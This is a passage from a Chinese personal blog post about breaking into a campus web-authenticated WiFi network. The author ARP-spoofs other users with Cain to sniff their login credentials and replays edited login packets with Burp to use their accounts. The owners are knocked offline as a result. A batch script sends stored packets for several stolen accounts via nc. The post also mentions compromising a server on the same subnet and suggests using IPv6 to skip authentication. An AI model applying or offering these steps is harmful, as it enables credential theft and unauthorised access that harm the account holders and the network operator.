<p>长长的参数是url编码的数据，在成功联网后还蛋疼的decode了下，反正不是什么重要的信息。</p>
<p>准备工作做好了，那就开嗅吧。</p>
<p>因为尝试多次发现usernameHidden与username的值是相等的，且mac的值可以在嗅探器的url一栏里看到，所以打开cain，找到HTTP Fields，</p>
<p>在username field里只留下username，password field里只留下pwd。在cain中调到arp欺骗这一项，选几个顺眼的ip，开始等密码。不一会就得</p>
<p>到了好几组密码。</p>
<p>最开始以为无线网卡的mac地址必须改成与账号所对应的mac一样，但是苦于抓到包的参数中mac一项是经过加密的，貌似是MD5加密。但是拿着</p>
<p>自己的mac，猜了几种不同的形式，本地计算MD5，但都与数据包中的值不同。后来想了想，即使我猜对了mac的形式，我也不可能逆出mac啊…</p>
<p>没办法，硬着头皮把自己包中的mac、username、usernameHidden、pwd修改成嗅探得到的用户名密码以及mac部分的值，用brup发出去。</p>
<p>上百度测试一下，唔，成功连上了~</p>
<p>嗅探真是一个可怕的东东啊~</p>
<p>按照原理的话，对于web验证的wifi，只要登陆页面不是https加密的，我们就可以用这种方法进行突破，用其他人的账户密码上网。</p>
<p>总结：</p>
<p>首先本地抓包查找数据包中的有用以及必要的信息，接下来嗅探得可以进行授权认证的信息，最后修改数据包发送至服务器完成验证。</p>
<p>后记：</p>
<p>实际中发现，这个验证不能用于多个人。即我蹭网之后，原主人的网就掉了。没办法，我只能抓了好几个人的密码之后挨个试了，希望原主人正好</p>
<p>离开~</p>
<p>嫌麻烦，写了个批处理，用nc发包。附上代码：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">echo</span> off</div><div class="line">Title Wifi蹭网 by delete</div><div class="line"><span class="keyword">echo</span> *******************************************************************************</div><div class="line"><span class="keyword">echo</span> Wifi蹭网免验证 by delete</div><div class="line"><span class="keyword">echo</span> *******************************************************************************</div><div class="line"><span class="keyword">echo</span> 请从以下学号中选择一个：</div><div class="line"><span class="keyword">echo</span> <span class="number">1</span>\. Xxxxxx</div><div class="line"><span class="keyword">echo</span> <span class="number">2</span>\. Xxxxxx</div><div class="line"><span class="keyword">echo</span> <span class="number">3</span>\. Xxxxxx</div><div class="line"><span class="keyword">echo</span> <span class="number">4</span>\. Xxxxxx</div><div class="line"><span class="keyword">echo</span> <span class="number">5</span>\. Xxxxxx</div><div class="line"><span class="keyword">echo</span> <span class="number">6</span>\. Xxxxxx</div><div class="line"><span class="keyword">set</span> choice=</div><div class="line"><span class="keyword">set</span> /p choice=请选择:</div><div class="line"><span class="flow">if</span> <span class="flow">not</span> &quot;<span class="envvar">%Choice%</span>&quot;==&quot;&quot; <span class="keyword">set</span> Choice=<span class="envvar">%Choice:~0,1%</span></div><div class="line"><span class="flow">if</span> /i &quot;<span class="envvar">%choice%</span>&quot;==&quot;<span class="number">1</span>&quot; <span class="flow">goto</span> st1</div><div class="line"><span class="flow">if</span> /i &quot;<span class="envvar">%choice%</span>&quot;==&quot;<span class="number">2</span>&quot; <span class="flow">goto</span> st2</div><div class="line"><span class="flow">if</span> /i &quot;<span class="envvar">%choice%</span>&quot;==&quot;<span class="number">3</span>&quot; <span class="flow">goto</span> st3</div><div class="line"><span class="flow">if</span> /i &quot;<span class="envvar">%choice%</span>&quot;==&quot;<span class="number">4</span>&quot; <span class="flow">goto</span> st4</div><div class="line"><span class="flow">if</span> /i &quot;<span class="envvar">%choice%</span>&quot;==&quot;<span class="number">5</span>&quot; <span class="flow">goto</span> st5</div><div class="line"><span class="flow">if</span> /i &quot;<span class="envvar">%choice%</span>&quot;==&quot;<span class="number">6</span>&quot; <span class="flow">goto</span> st6</div><div class="line"></div><div class="line">:st1</div><div class="line">nc -n xx.xx.xx.xx <span class="number">80</span> &lt; ./data/st1.txt</div><div class="line"><span class="flow">goto</span> end</div><div class="line">:st2</div><div class="line">nc -n xx.xx.xx.xx <span class="number">80</span> &lt; ./data/st2.txt</div><div class="line"><span class="flow">goto</span> end</div><div class="line">:st3</div><div class="line">nc -n xx.xx.xx.xx <span class="number">80</span> &lt; ./data/st3.txt</div><div class="line"><span class="flow">goto</span> end</div><div class="line">:st4</div><div class="line">nc -n xx.xx.xx.xx <span class="number">80</span> &lt; ./data/st4.txt</div><div class="line"><span class="flow">goto</span> end</div><div class="line">:st5</div><div class="line">nc -n xx.xx.xx.xx <span class="number">80</span> &lt; ./data/st5.txt</div><div class="line"><span class="flow">goto</span> end</div><div class="line">:st6</div><div class="line">nc -n xx.xx.xx.xx <span class="number">80</span> &lt; ./data/st6.txt</div><div class="line"><span class="flow">goto</span> end</div><div class="line"></div><div class="line">:end</div></pre></td></tr></table></figure>

<p>用法是将nc.exe放在该bat脚本同一目录下，并新建data文件夹，存放有不同账户对应的数据包的信息的txt文件。具体的命名什么的看一下脚本就懂了。</p>
<p>有个bug是运行到调用nc时，会卡在nc提交数据包得到返回的界面，不能自动结束。运行前还要先随便打开一个网页，以完成本机参数初始化…</p>
<p>再后来，日下了与验证网页所在服务器同网段的一台服务器，装上cain怎么嗅都嗅不到，甚是郁闷。Arp欺骗那里显示half routing，没有一个full</p>
<p>routing。而嗅探其他的服务器却不是这样的。莫非装了牛b的防火墙？求大牛解答~</p>
<p>还有一个更奇葩的问题，几天之后，当我再次想嗅探一下来获得更多的用户名密码的时候，开cain嗅探居然进行arp欺骗的时候劫持不到数据包，有</p>
<p>点想不通了。<br>最后废话一句，很多学校都已经支持ipv6了，我当前测试的无线路由是支持ipv6的。而登陆验证只限于ipv4，这样其实直接就能上ipv6的网的。网</p>
<p>上有很多ipv6转ipv4的方法，其中一个是sixxs.org，我个人觉得最好的是Veno2这个软件。有机会有条件的话大家不妨百度下具体的方法试试~</p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="http://weibo.com/creturn"><strong>creturn</strong></a> - 7月 31 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
	 
     		  
  
  <div class="categories">
    <a href="/categories/技术文章/">技术文章</a>
  </div>

       		
  
  <div class="tags">
    <a href="/tags/cain/">cain</a>, <a href="/tags/web-wifi认证/">web wifi认证</a>, <a href="/tags/嗅探/">嗅探</a>
  </div>

     		  
       	 
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
</div>


  </div>
</body>
</html>